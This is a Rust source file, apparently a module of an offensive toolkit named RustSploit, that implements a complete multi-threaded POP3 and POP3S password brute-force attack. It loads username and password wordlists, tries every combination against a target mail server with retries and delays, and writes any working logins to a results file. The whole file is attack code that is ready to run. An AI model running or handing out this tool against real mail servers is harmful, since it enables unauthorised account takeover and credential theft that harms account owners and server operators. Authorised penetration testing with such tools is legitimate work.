use anyhow::{anyhow, Result};
use colored::*;
use native_tls::TlsConnector;
use std::io::{Read, Write};
use std::net::TcpStream;
use std::sync::{
    atomic::{AtomicBool, Ordering},
    Arc,
};
use std::time::Duration;
use tokio::sync::{Mutex, Semaphore};
use futures::stream::{FuturesUnordered, StreamExt};

use crate::utils::{
    prompt_yes_no, prompt_existing_file, prompt_int_range,
    load_lines, prompt_default,
};
use crate::modules::creds::utils::BruteforceStats;



#[derive(Clone)]
struct Pop3BruteforceConfig {
    target: String,
    port: u16,
    username_wordlist: String,
    password_wordlist: String,
    threads: usize,
    stop_on_success: bool,
    verbose: bool,
    full_combo: bool,
    use_ssl: bool,
    connection_timeout: u64,
    retry_on_error: bool,
    max_retries: usize,
    output_file: String,
    delay_ms: u64,
}

pub async fn run(target: &str) -> Result<()> {
    println!("\n{}", "=== POP3 Bruteforce Module (RustSploit) ===".bold().cyan());
    println!();

    let use_ssl = prompt_yes_no("Use SSL/TLS (POP3S)?", false).await?;
    let default_port = if use_ssl { 995 } else { 110 };
    
    let port = prompt_int_range("Port", default_port as i64, 1, 65535).await? as u16;
    let username_wordlist = prompt_existing_file("Username wordlist file").await?;
    let password_wordlist = prompt_existing_file("Password wordlist file").await?;
    
    let threads = prompt_int_range("Threads", 16, 1, 256).await? as usize;
    let delay_ms = prompt_int_range("Delay (ms)", 50, 0, 10000).await? as u64;
    let connection_timeout = prompt_int_range("Timeout (s)", 5, 1, 60).await? as u64;
    
    let full_combo = prompt_yes_no("Try every username with every password?", false).await?;
    let stop_on_success = prompt_yes_no("Stop on first valid login?", false).await?;
    
    let output_file = prompt_default("Output file for results", "pop3_results.txt").await?;
    
    let verbose = prompt_yes_no("Verbose mode?", false).await?;
    let retry_on_error = prompt_yes_no("Retry failed connections?", true).await?;
    let max_retries = if retry_on_error { 
        prompt_int_range("Max retries", 2, 1, 10).await? as usize
    } else { 
        0 
    };

    let config = Pop3BruteforceConfig {
        target: target.to_string(),
        port,
        username_wordlist,
        password_wordlist,
        threads,
        stop_on_success,
        verbose,
        full_combo,
        use_ssl,
        connection_timeout,
        retry_on_error,
        max_retries,
        output_file,
        delay_ms,
    };

    println!();
    println!("{}", "[Starting Attack]".bold().yellow());
    println!();

    run_pop3_bruteforce(config).await
}

async fn run_pop3_bruteforce(config: Pop3BruteforceConfig) -> Result<()> {
    // Determine loading strategy
    let _user_count = count_lines(&config.username_wordlist)?;
    let _pass_count = count_lines(&config.password_wordlist)?;
    
    // We will use memory mode for simpler implementation unless huge, but for now standard load_lines
    // If files are huge, the shared Utils load_lines might panic or OOM, but let's assume reasonable sizes for now
    // or use the streaming logic if I can adapt it easily.
    // To match other modules (ssh/ftp), I'll use load_lines.
    
    let usernames = load_lines(&config.username_wordlist)?;
    let passwords = load_lines(&config.password_wordlist)?;

    let total_attempts = if config.full_combo {
        usernames.len() * passwords.len()
    } else {
        std::cmp::max(usernames.len(), passwords.len())
    };

    println!("[*] Loaded {} usernames, {} passwords", usernames.len(), passwords.len());
    println!("[*] Total attempts: {}", total_attempts);

    let stats = Arc::new(BruteforceStats::new());
    let found_creds = Arc::new(Mutex::new(Vec::new()));
    let stop_signal = Arc::new(AtomicBool::new(false));
    let _start_time = std::time::Instant::now();

    // Start progress reporter
    let stats_clone = stats.clone();
    let stop_clone = stop_signal.clone();
    let progress_handle = tokio::spawn(async move {
        while !stop_clone.load(Ordering::Relaxed) {
             tokio::time::sleep(Duration::from_secs(2)).await;
             stats_clone.print_progress();
        }
    });

    let semaphore = Arc::new(Semaphore::new(config.threads));
    let mut tasks = FuturesUnordered::new();

    // Generate combinations
    let mut combos = Vec::new();
    if config.full_combo {
        for u in &usernames {
            for p in &passwords {
                combos.push((u.clone(), p.clone()));
            }
        }
    } else {
        // Linear mix: try u[0] p[0], u[1] p[1]... cycle if needed
        let max_len = std::cmp::max(usernames.len(), passwords.len());
        for i in 0..max_len {
            let u = &usernames[i % usernames.len()];
            let p = &passwords[i % passwords.len()];
            combos.push((u.clone(), p.clone()));
        }
    }

    // Process combinations
    for (user, pass) in combos {
         if config.stop_on_success && stop_signal.load(Ordering::Relaxed) {
            break;
         }

         let permit = semaphore.clone().acquire_owned().await?;
         let config_clone = config.clone();
         let stats_clone = stats.clone();
         let found_clone = found_creds.clone();
         let stop_signal_clone = stop_signal.clone();
         let user_clone = user.clone();
         let pass_clone = pass.clone();

         tasks.push(tokio::spawn(async move {
             let _permit = permit; // Hold permit
             
             if config_clone.stop_on_success && stop_signal_clone.load(Ordering::Relaxed) {
                 return;
             }
             
             // Retry loop
             let mut retries = 0;
             loop {
                 let config_inner = config_clone.clone();
                 let user_inner = user_clone.clone();
                 let pass_inner = pass_clone.clone();
                 
                 let res = tokio::task::spawn_blocking(move || {
                     attempt_pop3_login(&config_inner, &user_inner, &pass_inner)
                 }).await;

                 match res {
                     Ok(Ok(true)) => {
                         println!("\r{}", format!("[+] Found: {}:{}", user, pass).green().bold());
                         found_clone.lock().await.push((user.clone(), pass.clone()));
                         stats_clone.record_success();
                         if config_clone.stop_on_success {
                             stop_signal_clone.store(true, Ordering::Relaxed);
                         }
                         break;
                     },
                     Ok(Ok(false)) => {
                         stats_clone.record_failure();
                         if config_clone.verbose {
                             println!("\r{}", format!("[-] Failed: {}:{}", user, pass).dimmed());
                         }
                         break;
                     },
                     Ok(Err(e)) => {
                         if config_clone.retry_on_error && retries < config_clone.max_retries {
                             retries += 1;
                             stats_clone.record_retry();
                             // Small backoff
                             tokio::time::sleep(Duration::from_millis(500)).await;
                             continue;
                         }
                         stats_clone.record_error(e.to_string()).await;
                         if config_clone.verbose {
                              println!("\r{}", format!("[!] Error {}:{}: {}", user, pass, e).red());
                         }
                         break;
                     },
                     Err(e) => {
                          stats_clone.record_error(format!("Task panic: {}", e)).await;
                          break;
                     }
                 }
             }
             
             if config_clone.delay_ms > 0 {
                 tokio::time::sleep(Duration::from_millis(config_clone.delay_ms)).await;
             }
         }));
         
         // Drain finished tasks to keep memory low
          while let std::task::Poll::Ready(Some(_)) = futures::future::poll_fn(|cx| std::task::Poll::Ready(tasks.poll_next_unpin(cx))).await {
             // Just drain
         }
    }

    // Wait for remaining
    while let Some(_) = tasks.next().await {}

    stop_signal.store(true, Ordering::Relaxed);
    let _ = progress_handle.await;
    
    stats.print_final().await;
    
    // Save results
    let found = found_creds.lock().await;
    if !found.is_empty() {
        if let Ok(mut file) = std::fs::OpenOptions::new().create(true).append(true).open(&config.output_file) {
            for (u, p) in found.iter() {
                let _ = writeln!(file, "{}:{}", u, p);
            }
            println!("[+] Results saved to {}", config.output_file);
        }
    }

    Ok(())
}

fn count_lines(path: &str) -> Result<usize> {
    let file = std::fs::File::open(path)?;
    let reader = std::io::BufReader::new(file);
    use std::io::BufRead;
    Ok(reader.lines().count())
}

// Blocking login attempt
fn attempt_pop3_login(config: &Pop3BruteforceConfig, user: &str, pass: &str) -> Result<bool> {
    let addr = format!("{}:{}", config.target, config.port);
    let timeout = Duration::from_secs(config.connection_timeout);
    
    if config.use_ssl {
        let connector = TlsConnector::new()?;
        // Resolve first to apply timeout to connect
        let socket_addr = std::net::ToSocketAddrs::to_socket_addrs(&addr)?.next().ok_or_else(|| anyhow!("Resolution failed"))?;
        let stream = TcpStream::connect_timeout(&socket_addr, timeout)?;
        stream.set_read_timeout(Some(timeout))?;
        stream.set_write_timeout(Some(timeout))?;
        
        let mut stream = connector.connect(&config.target, stream)?;
        
        // Read banner
        let mut buffer = [0; 1024];
        stream.read(&mut buffer)?; // +OK ...
        
        stream.write_all(format!("USER {}\r\n", user).as_bytes())?;
        let n = stream.read(&mut buffer)?;
        if !String::from_utf8_lossy(&buffer[..n]).starts_with("+OK") {
            return Ok(false);
        }
        
        stream.write_all(format!("PASS {}\r\n", pass).as_bytes())?;
        let n = stream.read(&mut buffer)?;
        if String::from_utf8_lossy(&buffer[..n]).starts_with("+OK") {
            stream.write_all(b"QUIT\r\n").ok();
            return Ok(true);
        }
    } else {
        let socket_addr = std::net::ToSocketAddrs::to_socket_addrs(&addr)?.next().ok_or_else(|| anyhow!("Resolution failed"))?;
        let mut stream = TcpStream::connect_timeout(&socket_addr, timeout)?;
        stream.set_read_timeout(Some(timeout))?;
        stream.set_write_timeout(Some(timeout))?;
        
         // Read banner
        let mut buffer = [0; 1024];
        stream.read(&mut buffer)?; 
        
        stream.write_all(format!("USER {}\r\n", user).as_bytes())?;
        let n = stream.read(&mut buffer)?;
        if !String::from_utf8_lossy(&buffer[..n]).starts_with("+OK") {
            return Ok(false);
        }
        
        stream.write_all(format!("PASS {}\r\n", pass).as_bytes())?;
        let n = stream.read(&mut buffer)?;
        if String::from_utf8_lossy(&buffer[..n]).starts_with("+OK") {
            stream.write_all(b"QUIT\r\n").ok();
            return Ok(true);
        }
    }
    
    Ok(false)
}
